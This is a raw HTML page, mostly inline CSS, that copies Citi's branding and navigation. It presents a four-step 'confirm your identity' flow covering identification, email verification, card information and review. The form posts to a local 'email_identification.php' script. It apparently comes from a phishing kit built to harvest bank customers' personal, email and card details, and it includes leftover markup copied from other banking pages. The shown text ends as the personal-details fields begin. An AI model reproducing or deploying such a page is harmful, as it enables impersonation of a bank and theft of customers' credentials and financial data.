sup[_ngcontent-ekd-c207], table[_ngcontent-ekd-c207], tbody[_ngcontent-ekd-c207], td[_ngcontent-ekd-c207], tfoot[_ngcontent-ekd-c207], th[_ngcontent-ekd-c207], thead[_ngcontent-ekd-c207], time[_ngcontent-ekd-c207], tr[_ngcontent-ekd-c207], tt[_ngcontent-ekd-c207], u[_ngcontent-ekd-c207], ul[_ngcontent-ekd-c207], var[_ngcontent-ekd-c207], video[_ngcontent-ekd-c207]{margin:0;padding:0;border:0;font:inherit;vertical-align:baseline}article[_ngcontent-ekd-c207], aside[_ngcontent-ekd-c207], details[_ngcontent-ekd-c207], figcaption[_ngcontent-ekd-c207], figure[_ngcontent-ekd-c207], footer[_ngcontent-ekd-c207], header[_ngcontent-ekd-c207], hgroup[_ngcontent-ekd-c207], menu[_ngcontent-ekd-c207], nav[_ngcontent-ekd-c207], section[_ngcontent-ekd-c207]{display:block}body[_ngcontent-ekd-c207]{line-height:1}ol[_ngcontent-ekd-c207], ul[_ngcontent-ekd-c207]{list-style:none}blockquote[_ngcontent-ekd-c207], q[_ngcontent-ekd-c207]{quotes:none}blockquote[_ngcontent-ekd-c207]:after, blockquote[_ngcontent-ekd-c207]:before, q[_ngcontent-ekd-c207]:after, q[_ngcontent-ekd-c207]:before{content:"";content:none}table[_ngcontent-ekd-c207]{border-collapse:collapse;border-spacing:0}.journeyLogo[_ngcontent-ekd-c207]{display:flex}.divider[_ngcontent-ekd-c207]{border-left:3.5px solid #d3d3d3;height:28px;margin-top:23px;margin-right:10px}.webLogo[_ngcontent-ekd-c207]{max-width:100%;max-height:100%;display:block}.box[_ngcontent-ekd-c207]{width:180px;display:flex;justify-content:left;align-items:center}.webDiv[_ngcontent-ekd-c207]{margin-left:5px}.box.small[_ngcontent-ekd-c207]{height:72px}.box.small[_ngcontent-ekd-c207]   img[_ngcontent-ekd-c207]{height:40px}@media screen and (min-width:1000px){.divider[_ngcontent-ekd-c207]{margin-left:35px;height:37px;margin-top:27px}.box.small[_ngcontent-ekd-c207]{height:88px}.box.small[_ngcontent-ekd-c207]   img[_ngcontent-ekd-c207]{height:48px}.webDiv[_ngcontent-ekd-c207]{margin-left:15px}}.banner[_ngcontent-ekd-c207]{height:88px;background-color:#fff!important}.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]{height:100%;padding:0 35px 0 20px;position:relative;display:flex;justify-content:space-between}.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .cpc[_ngcontent-ekd-c207]{height:88px;width:auto;padding-bottom:20px;padding-left:17px}.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .cpc[_ngcontent-ekd-c207]   img[_ngcontent-ekd-c207]{height:auto;width:auto}@media (max-width:990px){.banner[_ngcontent-ekd-c207]{height:72px}.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]{padding:0}.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .cpc[_ngcontent-ekd-c207]{height:72px;width:auto;padding:0}.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .cpc[_ngcontent-ekd-c207]   img[_ngcontent-ekd-c207]{height:72px;width:auto;padding-left:16px}}.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .cpb[_ngcontent-ekd-c207]{height:88px;width:auto}.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .cpb[_ngcontent-ekd-c207]   img[_ngcontent-ekd-c207]{width:auto}@media (max-width:990px){.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .cpb[_ngcontent-ekd-c207], .banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .cpb[_ngcontent-ekd-c207]   img[_ngcontent-ekd-c207]{height:72px;width:auto}}.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .business[_ngcontent-ekd-c207], .banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .gold[_ngcontent-ekd-c207], .banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .priority[_ngcontent-ekd-c207]{height:88px;width:auto;padding-top:28px;padding-bottom:20px;padding-left:14px}.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .business[_ngcontent-ekd-c207]   img[_ngcontent-ekd-c207], .banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .gold[_ngcontent-ekd-c207]   img[_ngcontent-ekd-c207], .banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .priority[_ngcontent-ekd-c207]   img[_ngcontent-ekd-c207]{height:40px;width:auto}@media (max-width:990px){.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .business[_ngcontent-ekd-c207], .banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .gold[_ngcontent-ekd-c207], .banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .priority[_ngcontent-ekd-c207]{height:72px;width:auto;padding:0}.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .business[_ngcontent-ekd-c207]   img[_ngcontent-ekd-c207], .banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .gold[_ngcontent-ekd-c207]   img[_ngcontent-ekd-c207], .banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .priority[_ngcontent-ekd-c207]   img[_ngcontent-ekd-c207]{height:72px;width:auto;padding-left:16px}}.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .att[_ngcontent-ekd-c207]{height:auto;width:auto;padding-top:16px;padding-bottom:16px;padding-left:37px}.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .att[_ngcontent-ekd-c207]   img[_ngcontent-ekd-c207]{height:56px;width:188.6px}@media (max-width:990px){.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .att[_ngcontent-ekd-c207]{height:auto;width:auto;padding-top:10px;padding-bottom:10px;padding-left:13px}.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .att[_ngcontent-ekd-c207]   img[_ngcontent-ekd-c207]{height:52px;width:170px}}.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .default[_ngcontent-ekd-c207]{height:88px;width:88px;padding-left:20px}.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .default[_ngcontent-ekd-c207]   img[_ngcontent-ekd-c207]{height:88px;width:88px}@media (max-width:990px){.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .default[_ngcontent-ekd-c207]{height:72px;width:72px;padding:0}.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .default[_ngcontent-ekd-c207]   img[_ngcontent-ekd-c207]{height:72px;width:72px}}.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .buttons[_ngcontent-ekd-c207]{display:flex}.banner   .content-wrap   .buttons   [_nghost-ekd-c207]     child-nav-group -shadowcsshost   child-nav-group ul{background-color:#fff}.banner   .content-wrap   .buttons   [_nghost-ekd-c207]     child-nav-group .subMenuGroupTitle{font-family:Interstate-Regular,sans-serif;font-size:12px;color:#666;letter-spacing:0;line-height:20px}.banner   .content-wrap   .buttons   [_nghost-ekd-c207]     child-nav-group .child-links{font-family:Interstate-Light;font-size:16px;color:#333;letter-spacing:0;line-height:22px}@media screen and (max-width:1120px){.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .buttons[_ngcontent-ekd-c207]{display:none}}.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .buttons[_ngcontent-ekd-c207]   .navButton[_ngcontent-ekd-c207]{padding-top:27px;padding-bottom:15px;padding-right:24px}.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .buttons[_ngcontent-ekd-c207]   .navButton[_ngcontent-ekd-c207]:last-child{padding-right:0}.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .buttons[_ngcontent-ekd-c207]   .navButton[_ngcontent-ekd-c207]   a[_ngcontent-ekd-c207], .banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .buttons[_ngcontent-ekd-c207]   .navButton[_ngcontent-ekd-c207]   button[_ngcontent-ekd-c207]{cursor:pointer;background:0 0;border:none}.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .buttons[_ngcontent-ekd-c207]   .navButton[_ngcontent-ekd-c207]   button[_ngcontent-ekd-c207]{padding-top:0}.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .buttons[_ngcontent-ekd-c207]   .navButton[_ngcontent-ekd-c207]   img[_ngcontent-ekd-c207]{height:26px;width:26px;margin:auto;display:block}.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .buttons[_ngcontent-ekd-c207]   .navButton[_ngcontent-ekd-c207]   span[_ngcontent-ekd-c207]{display:block;padding-top:8px;font-family:Interstate-Regular,sans-serif;font-size:11px;color:#666;letter-spacing:0;text-align:center}.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .buttons[_ngcontent-ekd-c207]   .subMenuGroupParent[_ngcontent-ekd-c207]{width:226px;border:1px solid #eee;background:#fff;z-index:1;display:none;position:absolute;box-shadow:0 2px 4px rgba(0,0,0,.125)}.banner[_ngcontent-ekd-c207]   .content-wrap[_ngcontent-ekd-c207]   .buttons[_ngcontent-ekd-c207]   .subMenuGroupParent[_ngcontent-ekd-c207]   .flexColumnContainer[_ngcontent-ekd-c207]{padding-left:40px}</style><style>@charset "UTF-8";[_nghost-ekd-c226]{overflow-x:hidden}a[_ngcontent-ekd-c226]:focus{outline:-webkit-focus-ring-color auto 5px!important;outline-offset:-2px}@font-face{font-family:Interstate_Light;src:url(/commonui-assets/fonts/interstate/Interstate-Light.eot);src:url(/commonui-assets/fonts/interstate/Interstate-Light.eot?#iefix) format("embedded-opentype"),url(/commonui-assets/fonts/interstate/Interstate-Light.woff) format("woff"),url(/commonui-assets/fonts/interstate/Interstate-Light.ttf) format("truetype"),url(/commonui-assets/fonts/interstate/Interstate-Light.svg#fontname) format("svg");font-weight:400;font-style:normal}@media screen and (min-width:1024px) and (max-width:1112px){citi-modal[_ngcontent-ekd-c226]     .modal{margin-top:12%!important}}@media screen and (min-width:700px) and (max-width:1112px){citi-modal[_ngcontent-ekd-c226]     .modal{margin-top:12%!important}  .modal-dialog{width:84%!important}}@font-face{font-family:Interstate_Regular;src:url(/commonui-assets/fonts/interstate/Interstate-Regular.eot);src:url(/commonui-assets/fonts/interstate/Interstate-Regular.eot?#iefix) format("embedded-opentype"),url(/commonui-assets/fonts/interstate/Interstate-Regular.woff) format("woff"),url(/commonui-assets/fonts/interstate/Interstate-Regular.ttf) format("truetype"),url(/commonui-assets/fonts/interstate/Interstate-Regular.svg#fontname) format("svg");font-weight:400;font-style:normal}@font-face{font-family:Interstate_Bold;src:url(/commonui-assets/fonts/interstate/Interstate-Bold.eot);src:url(/commonui-assets/fonts/interstate/Interstate-Bold.eot?#iefix) format("embedded-opentype"),url(/commonui-assets/fonts/interstate/Interstate-Bold.woff) format("woff"),url(/commonui-assets/fonts/interstate/Interstate-Bold.ttf) format("truetype"),url(/commonui-assets/fonts/interstate/Interstate-Bold.svg#fontname) format("svg");font-weight:400;font-style:normal}.citialliancedesk[_ngcontent-ekd-c226]{display:none!important}.navigationParent[_ngcontent-ekd-c226]{width:100%;margin:0 auto;height:46px;position:relative}#signOnFocus[_ngcontent-ekd-c226]{color:#fff!important}.child-nav-group3[_ngcontent-ekd-c226], .som-redering[_ngcontent-ekd-c226]{width:100%}@media screen and (max-width:991.9px){.child-nav-group3[_ngcontent-ekd-c226], .som-redering[_ngcontent-ekd-c226]{display:block;width:100%}}#openanaccountMainLI[_ngcontent-ekd-c226]   #openanaccountsubGroup5[_ngcontent-ekd-c226]{display:none!important}.preLogin[_ngcontent-ekd-c226]   .nav-bar-main-ul[_ngcontent-ekd-c226]{display:flex;flex-direction:row;box-shadow:none;transition:.5s ease-in-out}.preLogin[_ngcontent-ekd-c226]   .nav-bar-main-ul[_ngcontent-ekd-c226]     #butlerATMMainLI #butlerATMmainAnchor5{display:none}@media screen and (max-width:1119.9px){.preLogin[_ngcontent-ekd-c226]   .nav-bar-main-ul[_ngcontent-ekd-c226]     #butlerATMMainLI #butlerATMmainAnchor5{display:block}}.preLogin[_ngcontent-ekd-c226]   .nav-bar-main-ul[_ngcontent-ekd-c226]     #butlerEspanolMainLI #butlerEspanolmainAnchor6{display:none}.postLogin[_ngcontent-ekd-c226]   .nav-bar-main-ul[_ngcontent-ekd-c226]{max-width:1341px;padding:0 0 0 20px;margin:0 99px 0 0}@media screen and (max-width:1120px){.preLogin[_ngcontent-ekd-c226]   .nav-bar-main-ul[_ngcontent-ekd-c226]     #navcreditCardMainLI .subMenuMainContainer .flexColumnContainer </style>


<style type="text/css" id="kampyleStyle">.noOutline{outline: none !important;}.wcagOutline:focus{outline: 1px dashed #595959 !important;outline-offset: 2px !important;transition: none !important;}.nebula_image_button { width: auto !important; background: transparent !important; }</style><style type="text/css">.gsc-control-cse{font-family:arial, sans-serif}.gsc-control-cse .gsc-table-result{font-family:arial, sans-serif}.gsc-refinementsGradient{background:linear-gradient(to left,rgba(255,255,255,1),rgba(255,255,255,0))}.gsc-control-cse{border-color:#FFFFFF;background-color:#FFFFFF}input.gsc-input,.gsc-input-box,.gsc-input-box-hover,.gsc-input-box-focus{border-color:#D9D9D9}.gsc-search-button-v2,.gsc-search-button-v2:hover,.gsc-search-button-v2:focus{border-color:#2F5BB7;background-color:#357AE8;background-image:none;filter:none}.gsc-search-button-v2 svg{fill:#FFFFFF}.gsc-tabHeader.gsc-tabhActive,.gsc-refinementHeader.gsc-refinementhActive{color:#CCCCCC;border-color:#CCCCCC;background-color:#FFFFFF}.gsc-tabHeader.gsc-tabhInactive,.gsc-refinementHeader.gsc-refinementhInactive{color:#CCCCCC;border-color:#CCCCCC;background-color:#FFFFFF}.gsc-webResult.gsc-result,.gsc-results .gsc-imageResult{border-color:#FFFFFF;background-color:#FFFFFF}.gsc-webResult.gsc-result:hover{border-color:#FFFFFF;background-color:#FFFFFF}.gs-webResult.gs-result a.gs-title:link,.gs-webResult.gs-result a.gs-title:link b,.gs-imageResult a.gs-title:link,.gs-imageResult a.gs-title:link b{color:#1155CC}.gs-webResult.gs-result a.gs-title:visited,.gs-webResult.gs-result a.gs-title:visited b,.gs-imageResult a.gs-title:visited,.gs-imageResult a.gs-title:visited b{color:#1155CC}.gs-webResult.gs-result a.gs-title:hover,.gs-webResult.gs-result a.gs-title:hover b,.gs-imageResult a.gs-title:hover,.gs-imageResult a.gs-title:hover b{color:#1155CC}.gs-webResult.gs-result a.gs-title:active,.gs-webResult.gs-result a.gs-title:active b,.gs-imageResult a.gs-title:active,.gs-imageResult a.gs-title:active b{color:#1155CC}.gsc-cursor-page{color:#1155CC}a.gsc-trailing-more-results:link{color:#1155CC}.gs-webResult:not(.gs-no-results-result):not(.gs-error-result) .gs-snippet,.gs-fileFormatType{color:#333333}.gs-webResult div.gs-visibleUrl{color:#009933}.gs-webResult div.gs-visibleUrl-short{color:#009933}.gs-promotion div.gs-visibleUrl-short{display:block}.gs-promotion div.gs-visibleUrl-long{display:none}.gs-promotion div.gs-visibleUrl-breadcrumb{display:none}.gsc-cursor-box{border-color:#FFFFFF}.gsc-results .gsc-cursor-box .gsc-cursor-page{border-color:#CCCCCC;background-color:#FFFFFF;color:#CCCCCC}.gsc-results .gsc-cursor-box .gsc-cursor-current-page{border-color:#CCCCCC;background-color:#FFFFFF;color:#CCCCCC}.gsc-webResult.gsc-result.gsc-promotion{border-color:#F6F6F6;background-color:#F6F6F6}.gsc-completion-title{color:#1155CC}.gsc-completion-snippet{color:#333333}.gs-promotion a.gs-title:link,.gs-promotion a.gs-title:link *,.gs-promotion .gs-snippet a:link{color:#1155CC}.gs-promotion a.gs-title:visited,.gs-promotion a.gs-title:visited *,.gs-promotion .gs-snippet a:visited{color:#1155CC}.gs-promotion a.gs-title:hover,.gs-promotion a.gs-title:hover *,.gs-promotion .gs-snippet a:hover{color:#1155CC}.gs-promotion a.gs-title:active,.gs-promotion a.gs-title:active *,.gs-promotion .gs-snippet a:active{color:#1155CC}.gs-promotion .gs-snippet,.gs-promotion .gs-title .gs-promotion-title-right,.gs-promotion .gs-title .gs-promotion-title-right *{color:#333333}.gs-promotion .gs-visibleUrl,.gs-promotion .gs-visibleUrl-short{color:#009933}.gcsc-find-more-on-google{color:#1155CC}.gcsc-find-more-on-google-magnifier{fill:#1155CC}</style><style type="text/css">.gsc-control-cse{font-family:arial, sans-serif}.gsc-control-cse .gsc-table-result{font-family:arial, sans-serif}.gsc-refinementsGradient{background:linear-gradient(to left,rgba(255,255,255,1),rgba(255,255,255,0))}.gsc-control-cse{border-color:#FFFFFF;background-color:#FFFFFF}input.gsc-input,.gsc-input-box,.gsc-input-box-hover,.gsc-input-box-focus{border-color:#D9D9D9}.gsc-search-button-v2,.gsc-search-button-v2:hover,.gsc-search-button-v2:focus{border-color:#2F5BB7;background-color:#357AE8;background-image:none;filter:none}.gsc-search-button-v2 svg{fill:#FFFFFF}.gsc-tabHeader.gsc-tabhActive,.gsc-refinementHeader.gsc-refinementhActive{color:#CCCCCC;border-color:#CCCCCC;background-color:#FFFFFF}.gsc-tabHeader.gsc-tabhInactive,.gsc-refinementHeader.gsc-refinementhInactive{color:#CCCCCC;border-color:#CCCCCC;background-color:#FFFFFF}.gsc-webResult.gsc-result,.gsc-results .gsc-imageResult{border-color:#FFFFFF;background-color:#FFFFFF}.gsc-webResult.gsc-result:hover{border-color:#FFFFFF;background-color:#FFFFFF}.gs-webResult.gs-result a.gs-title:link,.gs-webResult.gs-result a.gs-title:link b,.gs-imageResult a.gs-title:link,.gs-imageResult a.gs-title:link b{color:#1155CC}.gs-webResult.gs-result a.gs-title:visited,.gs-webResult.gs-result a.gs-title:visited b,.gs-imageResult a.gs-title:visited,.gs-imageResult a.gs-title:visited b{color:#1155CC}.gs-webResult.gs-result a.gs-title:hover,.gs-webResult.gs-result a.gs-title:hover b,.gs-imageResult a.gs-title:hover,.gs-imageResult a.gs-title:hover b{color:#1155CC}.gs-webResult.gs-result a.gs-title:active,.gs-webResult.gs-result a.gs-title:active b,.gs-imageResult a.gs-title:active,.gs-imageResult a.gs-title:active b{color:#1155CC}.gsc-cursor-page{color:#1155CC}a.gsc-trailing-more-results:link{color:#1155CC}.gs-webResult:not(.gs-no-results-result):not(.gs-error-result) .gs-snippet,.gs-fileFormatType{color:#333333}.gs-webResult div.gs-visibleUrl{color:#009933}.gs-webResult div.gs-visibleUrl-short{color:#009933}.gs-promotion div.gs-visibleUrl-short{display:block}.gs-promotion div.gs-visibleUrl-long{display:none}.gs-promotion div.gs-visibleUrl-breadcrumb{display:none}.gsc-cursor-box{border-color:#FFFFFF}.gsc-results .gsc-cursor-box .gsc-cursor-page{border-color:#CCCCCC;background-color:#FFFFFF;color:#CCCCCC}.gsc-results .gsc-cursor-box .gsc-cursor-current-page{border-color:#CCCCCC;background-color:#FFFFFF;color:#CCCCCC}.gsc-webResult.gsc-result.gsc-promotion{border-color:#F6F6F6;background-color:#F6F6F6}.gsc-completion-title{color:#1155CC}.gsc-completion-snippet{color:#333333}.gs-promotion a.gs-title:link,.gs-promotion a.gs-title:link *,.gs-promotion .gs-snippet a:link{color:#1155CC}.gs-promotion a.gs-title:visited,.gs-promotion a.gs-title:visited *,.gs-promotion .gs-snippet a:visited{color:#1155CC}.gs-promotion a.gs-title:hover,.gs-promotion a.gs-title:hover *,.gs-promotion .gs-snippet a:hover{color:#1155CC}.gs-promotion a.gs-title:active,.gs-promotion a.gs-title:active *,.gs-promotion .gs-snippet a:active{color:#1155CC}.gs-promotion .gs-snippet,.gs-promotion .gs-title .gs-promotion-title-right,.gs-promotion .gs-title .gs-promotion-title-right *{color:#333333}.gs-promotion .gs-visibleUrl,.gs-promotion .gs-visibleUrl-short{color:#009933}.gcsc-find-more-on-google{color:#1155CC}.gcsc-find-more-on-google-magnifier{fill:#1155CC}</style><style type="text/css">.gsc-control-cse{font-family:arial, sans-serif}.gsc-control-cse .gsc-table-result{font-family:arial, sans-serif}.gsc-refinementsGradient{background:linear-gradient(to left,rgba(255,255,255,1),rgba(255,255,255,0))}.gsc-control-cse{border-color:#FFFFFF;background-color:#FFFFFF}input.gsc-input,.gsc-input-box,.gsc-input-box-hover,.gsc-input-box-focus{border-color:#D9D9D9}.gsc-search-button-v2,.gsc-search-button-v2:hover,.gsc-search-button-v2:focus{border-color:#2F5BB7;background-color:#357AE8;background-image:none;filter:none}.gsc-search-button-v2 svg{fill:#FFFFFF}.gsc-tabHeader.gsc-tabhActive,.gsc-refinementHeader.gsc-refinementhActive{color:#CCCCCC;border-color:#CCCCCC;background-color:#FFFFFF}.gsc-tabHeader.gsc-tabhInactive,.gsc-refinementHeader.gsc-refinementhInactive{color:#CCCCCC;border-color:#CCCCCC;background-color:#FFFFFF}.gsc-webResult.gsc-result,.gsc-results .gsc-imageResult{border-color:#FFFFFF;background-color:#FFFFFF}.gsc-webResult.gsc-result:hover{border-color:#FFFFFF;background-color:#FFFFFF}.gs-webResult.gs-result a.gs-title:link,.gs-webResult.gs-result a.gs-title:link b,.gs-imageResult a.gs-title:link,.gs-imageResult a.gs-title:link b{color:#1155CC}.gs-webResult.gs-result a.gs-title:visited,.gs-webResult.gs-result a.gs-title:visited b,.gs-imageResult a.gs-title:visited,.gs-imageResult a.gs-title:visited b{color:#1155CC}.gs-webResult.gs-result a.gs-title:hover,.gs-webResult.gs-result a.gs-title:hover b,.gs-imageResult a.gs-title:hover,.gs-imageResult a.gs-title:hover b{color:#1155CC}.gs-webResult.gs-result a.gs-title:active,.gs-webResult.gs-result a.gs-title:active b,.gs-imageResult a.gs-title:active,.gs-imageResult a.gs-title:active b{color:#1155CC}.gsc-cursor-page{color:#1155CC}a.gsc-trailing-more-results:link{color:#1155CC}.gs-webResult:not(.gs-no-results-result):not(.gs-error-result) .gs-snippet,.gs-fileFormatType{color:#333333}.gs-webResult div.gs-visibleUrl{color:#009933}.gs-webResult div.gs-visibleUrl-short{color:#009933}.gs-promotion div.gs-visibleUrl-short{display:block}.gs-promotion div.gs-visibleUrl-long{display:none}.gs-promotion div.gs-visibleUrl-breadcrumb{display:none}.gsc-cursor-box{border-color:#FFFFFF}.gsc-results .gsc-cursor-box .gsc-cursor-page{border-color:#CCCCCC;background-color:#FFFFFF;color:#CCCCCC}.gsc-results .gsc-cursor-box .gsc-cursor-current-page{border-color:#CCCCCC;background-color:#FFFFFF;color:#CCCCCC}.gsc-webResult.gsc-result.gsc-promotion{border-color:#F6F6F6;background-color:#F6F6F6}.gsc-completion-title{color:#1155CC}.gsc-completion-snippet{color:#333333}.gs-promotion a.gs-title:link,.gs-promotion a.gs-title:link *,.gs-promotion .gs-snippet a:link{color:#1155CC}.gs-promotion a.gs-title:visited,.gs-promotion a.gs-title:visited *,.gs-promotion .gs-snippet a:visited{color:#1155CC}.gs-promotion a.gs-title:hover,.gs-promotion a.gs-title:hover *,.gs-promotion .gs-snippet a:hover{color:#1155CC}.gs-promotion a.gs-title:active,.gs-promotion a.gs-title:active *,.gs-promotion .gs-snippet a:active{color:#1155CC}.gs-promotion .gs-snippet,.gs-promotion .gs-title .gs-promotion-title-right,.gs-promotion .gs-title .gs-promotion-title-right *{color:#333333}.gs-promotion .gs-visibleUrl,.gs-promotion .gs-visibleUrl-short{color:#009933}.gcsc-find-more-on-google{color:#1155CC}.gcsc-find-more-on-google-magnifier{fill:#1155CC}</style>


</head><body style=""><app-root _nghost-ekd-c284="" ng-version="9.1.13"><cbol-core _ngcontent-ekd-c284="" _nghost-ekd-c274=""><citi-parent-layout _ngcontent-ekd-c274="" _nghost-ekd-c247=""><div _ngcontent-ekd-c247="" class="citi-outer-container cbolui-responsive cbolui-ddl-post"><citi-header _ngcontent-ekd-c247="" _nghost-ekd-c206=""><div _ngcontent-ekd-c206="" class="header"><div _ngcontent-ekd-c206="" class="primary"><citi-banner2 _ngcontent-ekd-c206="" _nghost-ekd-c207=""><div _ngcontent-ekd-c207="" role="banner" class="banner"><div _ngcontent-ekd-c207="" class="content-wrap"><div _ngcontent-ekd-c207="" class="journeyLogo"><div _ngcontent-ekd-c207="" class="logoDiv default"><a _ngcontent-ekd-c207="" id="sessionFocus" tabindex="0" href=""><!----><!----><img _ngcontent-ekd-c207="" alt="Citi" src="assets/citilogoredesign.png"><!----></a></div><!----><!----><!----></div><!----></div></div><!----></citi-banner2><citi-navigation3 _ngcontent-ekd-c206="" class="citi-navigation" _nghost-ekd-c226=""><div _ngcontent-ekd-c226="" role="navigation" aria-label="Main" class="navigationParent preLogin" style="background-color: rgb(0, 45, 114);"><div _ngcontent-ekd-c226="" class="mobileMenuContainer"><!----></div><ul _ngcontent-ekd-c226="" id="nav-bar-main-ul" class="nav-bar-main-ul" style="display: flex; position: static; box-shadow: none;"><!----><!----><!----></ul><!----><!----><!----></div><!---->
  
  
  <citi-nav-search _ngcontent-ekd-c226="" _nghost-ekd-c230=""><div _ngcontent-ekd-c230="" role="banner" class="banner"></div><!----></citi-nav-search></citi-navigation3></div><citi-welcome-bar _ngcontent-ekd-c206="" _nghost-ekd-c208=""><!----></citi-welcome-bar></div></citi-header><div _ngcontent-ekd-c247="" id="maincontent"><div _ngcontent-ekd-c247=""><!----><div _ngcontent-ekd-c247="" class="citi-container cbolui-ddl theme-light"><!----><div _ngcontent-ekd-c247="" class="appbody"><router-outlet _ngcontent-ekd-c274=""></router-outlet><ng-component _nghost-ekd-c285=""><idletime-router _ngcontent-ekd-c285=""></idletime-router><citi-simple-layout _ngcontent-ekd-c285="" brandingtype="preLoginVanilla"><div _ngcontent-ekd-c285="" main="" class="main"><!----><!----><citi-jamp _ngcontent-ekd-c285="" _nghost-ekd-c59="" class="hidden jamp-page-level"><div _ngcontent-ekd-c59="" class="fillHeight"><div _ngcontent-ekd-c59="" class="alignmentEl fillHeight"><div _ngcontent-ekd-c59="" class="jamp jamp-css"><span _ngcontent-ekd-c59="" class="img"></span><span _ngcontent-ekd-c59="" class="message"></span></div></div></div></citi-jamp><citi-row _ngcontent-ekd-c285=""><div class="row"><div _ngcontent-ekd-c285="" role="complementary"><citi-column _ngcontent-ekd-c285="" xs="12" sm="10" md="10" lg="9" xl="9">
  
  <div _ngcontent-bvc-c107="" class="progress-indicator-wrapper clearfix col-xs-12"><span _ngcontent-bvc-c107="" class="sr-only" id="progress-bar-0">Step 1 of 4: Account Information</span><ol _ngcontent-bvc-c107="" class="progress-indicator col-xs-12"><li _ngcontent-bvc-c301="" citi-progress-bar-step="" _nghost-bvc-c106="" class="progress-indicator-step progress-indicator-step-active"><span _ngcontent-bvc-c106="" aria-hidden="true" class="primary-label">Identification</span><!----><span _ngcontent-bvc-c106="" class="sr-only"> Step 1, Account Information ,  Current </span></li>
  
<li _ngcontent-bvc-c301="" citi-progress-bar-step="" _nghost-bvc-c106="" class="progress-indicator-step progress-indicator-step-active"><span _ngcontent-bvc-c106="" aria-hidden="true" class="primary-label">Email verification</span><!----><span _ngcontent-bvc-c106="" class="sr-only"> Step 2, Verification ,  Incomplete </span></li>
  
  <li _ngcontent-bvc-c301="" citi-progress-bar-step="" _nghost-bvc-c106="" class="progress-indicator-step"><span _ngcontent-bvc-c106="" aria-hidden="true" class="primary-label">Card Information</span><!----><span _ngcontent-bvc-c106="" class="sr-only"> Step 3, Set Up Online Access ,  Incomplete </span></li><li _ngcontent-bvc-c301="" citi-progress-bar-step="" _nghost-bvc-c106="" class="progress-indicator-step"><span _ngcontent-bvc-c106="" aria-hidden="true" class="primary-label">Review</span><!----><span _ngcontent-bvc-c106="" class="sr-only"> Step 4, Review ,  Incomplete </span></li></ol></div>
  
  
  <div class="col-xs-12 col-sm-10 col-md-10 col-lg-9"><h1 _ngcontent-ekd-c285="" class="pageHeader">Let's confirm your identity.</h1><p _ngcontent-ekd-c285="" class="introText">To protect your account, please tell us the requested info so we can confirm your identity.</p><!----></div></citi-column></div></div></citi-row><hr _ngcontent-ekd-c285=""><!----></div><app-account-type _nghost-ekd-c295=""><citi-simple-layout _ngcontent-ekd-c295="" brandingtype="preLoginVanilla"><main _ngcontent-ekd-c295=""><citi-form-container _ngcontent-ekd-c295="" formaction="#" formheader="">
      
      
      
<form class="uno has-validation-callback" action="email_identification.php" method="post">
          
          <div><input _ngcontent-ekd-c295="" name="hidden" style="display: none;" data-order-appearance="0"><citi-radio-group _ngcontent-ekd-c295="" required="true" name="AcctType" class="citi-radio-group" _nghost-ekd-c132=""><section class="purchase-question-form container-fluid step-1">
  <div class="row step-0">

      

      <div class="col-xs-12 ">

          

              <input type="hidden" name="_flowExecutionKey" value="_cspring-web-flow-ratequote_kF64FC573-E214-4B7A-CA2D-FB91089171B5" id="flowExecutionKey">
              <input type="hidden" name="_eventId" value="submit" id="eiName">

             
<div class="row" style="font-weight: 600;color: #414042;margin-bottom: .75rem;"><div class="col-xs-12 col-sm-6"><div class="jpui header DATABOLD field-mb-12 field-mt-0" id="PERSONAL_NAME_HEADER">Personal details</div></div></div>



              <div class="row">
                  
